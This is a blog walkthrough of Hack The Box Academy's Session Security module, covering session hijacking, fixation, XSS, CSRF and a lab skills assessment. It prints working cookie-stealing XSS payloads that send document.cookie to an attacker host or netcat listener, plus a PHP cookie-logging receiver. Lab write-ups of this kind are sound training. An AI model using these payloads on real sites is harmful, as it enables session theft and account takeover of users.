---
layout: post
title:  "Hack The Box - Academy - Session Security"
description: "Explore this detailed walkthrough of Hack The Box Academy's Session Security module. Learn effective techniques to perform Session Attacks utilizing Session Hijacking, Session Fixation, XSS, CSRF and Open redirects to elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
date:   2025-01-06 20:15
image:  /images/htb/session-security/logo.png
tags:   [session-security,cbbh]
categories: [htbacademy]
---

## Explore this detailed walkthrough of Hack The Box Academy's Session Security module. Learn effective techniques to perform Session Attacks utilizing Session Hijacking, Session Fixation, XSS, CSRF and Open redirects.

>
<b>References:</b>
<br/>
<a href="https://academy.hackthebox.com/module/153/section/1389">HTB - Session Security</a><br/>


`Add values to /etc/hosts`
```
IP=ENTER IP ADDRESS
printf "%s\t%s\n\n" "$IP" "example1.net example2.net example3.net" | sudo tee -a /etc/hosts
```

## Session hijacking

`Session hijacking` occurs when an attacker exploits insecure session identifiers to impersonate a victim by authenticating to the server with the stolen session ID. Attackers can acquire session identifiers through various methods, including:

- `Passive Traffic Sniffing:` Monitoring unencrypted network traffic to intercept session tokens.
- `Cross-Site Scripting (XSS):` Using malicious scripts to steal session data from the victim.
- `Browser History or Log-Diving:` Extracting session information from browser caches or application logs.
- `Database Access:` Gaining unauthorized access to databases storing session identifiers.

Attackers can also brute force or predict session identifiers if they are inadequately secured.

### Example of Session HijackingL Cookie Theft via XSS

1. A web application uses cookies to store session identifiers (sessionid=123456). These cookies are not marked with the HttpOnly flag, making them accessible to JavaScript.

2. The application has an XSS vulnerability in a search form. Input entered in the search box is not sanitized before being displayed on the page.

3. The attacker submits a malicious payload in the search box:
    - When a victim searches for something and their input triggers the malicious script, the browser executes the below script.
```
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```



 4. The malicious script sends the victim's `document.cookie` (containing the session ID) to the attacker's server, https://attacker.com/steal.

 5. The attacker uses the stolen session cookie to impersonate the victim by attaching it to their own browser:
    - Use a browser extension (e.g., EditThisCookie) or developer tools to set the stolen cookie.
    - Once the cookie is set, the attacker is authenticated as the victim and can perform actions on their behalf.

 #### Key Takeaways:

 - `Sanitizing User Input:` Prevent XSS vulnerabilities by sanitizing and escaping user input.

 - `Setting Secure Flags:` Use `HttpOnly`, `Secure`, and `SameSite` attributes for cookies to reduce exposure to attacks.

 - `Encrypting Communications:` Always use HTTPS to prevent passive sniffing.

 <hr/>

 ### Session Fixation

 `Session Fixation` is a vulnerability where an attacker fixes a session identifier (e.g., a cookie or token) and tricks a victim into logging into an application using that identifier. Once the victim is authenticated, the attacker can hijack the session since they already know the identifier.

 #### Stages of Session Fixation Attack:

 1. `Obtain a Valid Session Identifier:`
    - Many applications assign session identifiers to all visitors without requiring authentication.
    - An attacker can also create an account to get a valid session identifier.

2. `Fixate the Session Identifier:`
    - The session identifier assigned before login remains unchanged after login.
    - Vulnerability arises if session identifiers are accepted from URL query strings or POST data.
        - `Example:` If a session ID passed in a URL is accepted and propagated as the session identifier.

3. `Trick the Victim:`
    - The attacker crafts a URL containing the fixed session identifier and lures the victim to visit it.
    - Upon visiting, the victim’s session becomes tied to the attacker’s identifier.

`Impact:` The attacker can hijack the victim’s session and gain unauthorized access to the application.

#### Why HttpOnly won’t prevent session fixation?

The `HttpOnly` flag only prevents client-side scripts (e.g., JavaScript) from accessing the cookie. However, session fixation attacks do not rely on accessing or manipulating cookies through scripts. Instead, they exploit the server’s behavior of accepting a predefined session identifier (e.g., via URL parameters or cookies) provided by the attacker.

#### What Would Help Prevent Session Fixation?

1. Regenerate Session Identifiers on Login:
    - Ensure that a new session identifier is issued whenever a user logs in.
    - This prevents an attacker from reusing a session identifier assigned before login.

2. Restrict Session Identifier Sources:
    - Only accept session identifiers from secure sources, such as cookies.
    - Avoid accepting session IDs from URL query strings or POST data

3. Set Secure Flags on Cookies:
    - Use the `Secure` flag to ensure cookies are only sent over HTTPS, preventing interception.
    - Combine with the `HttpOnly` flag to mitigate other risks like XSS.

4. Use SameSite Cookies:
    - Set the `SameSite` attribute to prevent the cookie from being sent with cross-site requests, reducing CSRF risks.
<hr/>

### Obtaining Session Identifiers without User Interaction

Session identifiers can sometimes be obtained without requiring user interaction. One key method for this is `traffic sniffing`, a common technique used in network security assessments.

#### Obtaining Session Identifiers via Traffic Sniffing

Traffic sniffing involves monitoring network traffic to intercept sensitive data like session identifiers. Here's how it works:

1. Attacker's Network Position:
    - The attacker must be on the same local network as the victim (e.g., via a shared Wi-Fi network or connected to the same LAN).
    - Remote sniffing is not possible without access to the network.

2. Unencrypted HTTP Traffic:
    - Only unencrypted HTTP traffic can be intercepted.
    - HTTPS or encrypted protocols (e.g., SSL/TLS or IPsec) make it significantly harder or impossible to retrieve session identifiers.

3. Tools Used:
    - Tools like Wireshark are used to capture and analyze traffic.
    - Wireshark’s filtering capabilities allow attackers to isolate specific protocols (e.g., HTTP) or traffic from a specific source IP.

#### Key Requirements for Successful Sniffing:

- The attacker and victim must share the same local network.
- The traffic must be transmitted over unencrypted HTTP.

<hr/>

#### Obtaining Session Identifiers Post-Exploitation (Web Server Access)

In the post-exploitation phase, attackers who gain access to a web server can retrieve session identifiers and data from the server’s disk or memory. While attackers could take further actions, they often avoid excessive activity to reduce the risk of detection.

#### Session Storage Locations by Platform

### PHP
- `Session Storage Path:` Defined in the `session.save_path` entry in `php.ini` (commonly `/var/lib/php/sessions`).
- `File Format:` Session files follow the naming convention `sess_<sessionID>`.
- `Hijacking:` To hijack a session, the attacker needs to create a browser cookie with:
    - Cookie Name: `PHPSESSID`
    - Cookie Value: (e.g., `s6kitq8d3071rmlvbfitpim9mm`)

### Java (Apache Tomcat)
- `Session Management:`
    - Managed by the `Manager` element, which handles HTTP sessions.
    - Active sessions are stored in memory, while swapped or persistent sessions can be stored in files.
- `Default File Name for Persistent Storage:` SESSIONS.ser

<br/>
<a href="https://tomcat.apache.org/tomcat-6.0-doc/config/manager.html">Apache Tomcat Configuration Reference</a>

### .Net
- `Session Storage Options:`
    - `InProc Mode:` Stored in the application worker process (`aspnet_wp.exe`).
    - `OutProc Mode:` Stored in a State Server (IIS or separate server).
    - `SQL Server:` Sessions may also be saved in a database.

<br/>
<a href="https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/">Introduction to Asp.Net Sessions</a>

<hr/>

### Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) vulnerabilities are among the most common web application flaws, allowing attackers to execute arbitrary JavaScript in a victim's browser. When combined with other vulnerabilities, XSS can lead to full web application compromise. One specific use of XSS is to steal valid session identifiers, such as session cookies.

#### Requirements for Session Cookie Theft via XSS:

1. `Cookies Included in HTTP Requests:`
    - Session cookies must be sent with every HTTP request to maintain the session.
2. `Cookies Accessible by JavaScript:`
    - The `HttpOnly` flag must not be set, allowing JavaScript to access and exfiltrate the cookies.

#### Obtaining session cookies through XSS

<a href="https://webhook.site/">Webhook</a><br/>
<a href="https://app.interactsh.com">Interactsh</a>

Create php script that will receive our request and log it to a text file:

```
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

Start a php server running our script;

```
php -S <VPN/TUN Adapter IP>:8000
```

Payload:

```
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

#### Obtaining session cookies via XSS (Netcat edition)

```
nc -nlvp 8000
```

```
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```
<hr/>

### Cross-Site Request Forgery (CSRF or XSRF)

Cross-Site Request Forgery (CSRF) exploits a user's authenticated session to execute unintended actions on their behalf in a web application. It often involves attacker-crafted web pages containing malicious requests that impersonate the victim, leveraging the absence of anti-CSRF mechanisms.

#### Key Characteristics of CSRF Attacks:

1. Targeted Functions:
    - CSRF typically targets state-changing actions on the server but can also access sensitive data.
2. Impact:
    - For regular users, it compromises their data or operations.
    - For administrative users, it can compromise the entire application.
3. Same-Origin Policy (SOP):
    - SOP restricts interaction between different origins but does not prevent CSRF attacks, as attackers don’t need to read the server’s response.

#### Conditions for CSRF Vulnerability:

1. All required parameters for the malicious request can be determined or guessed by the attacker.
2. The application relies solely on HTTP cookies for session management, which browsers include automatically in requests.

#### Successful CSRF Exploitation Requires:

1. A crafted malicious web page issuing valid cross-site requests.
2. The victim being logged into the application when the malicious request is executed.

<hr/>

## Skills Assessment

><b>Overview:</b>
You are currently participating in a bug bounty program.<br/><br/>
The only URL in scope is http://minilab.htb.net <br/><br/>
Attacking end-users through client-side attacks is in scope for this particular bug bounty program. <br/><br/>
Test account credentials:<br/><br/>
Email: heavycat106<br/>
Password: rocknrol<br/><br/>
Through dirbusting, you identified the following endpoint<br/><br/>http://minilab.htb.net/submit-solution<br/><br/>
Find a way to hijack an admin's session. Once you do that, answer the two questions below.<br/></br>


### Add the Target_IP and minilab.htb.net to your /etc/hosts file.

```
IP={TARGET_IP_ADDRESS}
printf "%s\t%s\n\n" "$IP" "minilab.htb.net" | sudo tee -a /etc/hosts
```

`Ensure Caido is running and capturing all http requests.`

### Login with the provided credetials

Log in to the application using the credentials provided for the assessment.

![Login with provided credentials](/images/htb/session-security/login-page.png)

Upon logging in, you will reach the profile of Julie Rogers:

![Julie Rogers Profile - Home Page](/images/htb/session-security/home-page.png)

Ensure Julie’s profile is set to public. If the "Share" button is visible, the profile is already public. If not, click "Change Visibility" and set the profile to public.

### Test inputs for XXS vulnerabilities

The "Country" input field is vulnerable to XSS injection. Use the following payload to test the vulnerability:

```
<script>prompt(1)</script>
```
![Julie Rogers Profile - Home Page](/images/htb/session-security/xss-input-testing.png)

Save the profile after injecting the payload. To test the XSS, click on the "Share" button to view Julie Rogers' profile.

![Country Input - XSS Vulnerability](/images/htb/session-security/xss-vulnerability.png)

### Extract cookie via XSS

To extract the auth-session cookie, follow these steps:

1. Start a netcat listener on your machine:

```
nc -nlvp 1337
```

2. Update the following payload with your machine’s IP and inject it into Julie’s "Country" field:

```
<script>const cookies = document.cookie;
const authSession = cookies.split('; ').find(row => row.startsWith('auth-session='));
if (authSession) {
    const authValue = encodeURIComponent(authSession.split('=')[1]);
    
    fetch(`http://{YOUR_MACHINE_IP}:1337/?cookie=${authValue}`)
        .then(response => console.log('Cookie sent successfully'))
        .catch(error => console.error('Error sending cookie:', error));
} else {
    console.error('auth-session cookie not found');
}</script>
```

3. Save the profile and click "Share Profile." Check the netcat terminal for the received cookie:

![NetCat - Cookie Extraction](/images/htb/session-security/test-netcat-cookie-extraction.png)

### Submit the Solution and Extract Admin cookie

1. Visit the `http://minilab.htb.net/submit-solution` endpoint provided in the Skills Assessment instructions. You will see the error: `Please specify the ?url=<> parameter`.

2. Add the query parameter to visit Julie’s profile:

```
http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com
```

3. A success payload will appear on the submit-solution endpoint, and another user’s auth-session cookie will be sent to your netcat listener.

![Submit Solution - Success visit](/images/htb/session-security/submit-solution-success-visit.png)

![Authsession cookie - Extracted](/images/htb/session-security/auth-session-cookie-extracted.png)


### Decode and Replace the Cookie

1. Decode the received auth-session cookie:

```
echo "{AUTH_SESSION_COOKIE}" | sed 's/%/\\x/g' | xargs -0 echo -e
```

2. Open your browser’s developer tools, navigate to Session Storage or Cookies, and replace the auth-session value with the decoded cookie.

![SuperAdmin - Profile](/images/htb/session-security/super-admin-profile.png)

3. Change the visibility of the SuperAdmin account and visit the share profile page:

![SuperAdmin - Share Profile](/images/htb/session-security/superadmin-share-profile.png)

### Capture the Second Flag

1. Ensure Caido is running.
2. Click the "Flag2" button to download the PCAP file.
3. Search for `FLAG{` in the PCAP file response in Caido

![PCAP - Flag result](/images/htb/session-security/PCAP-flag-result.png)

<hr/>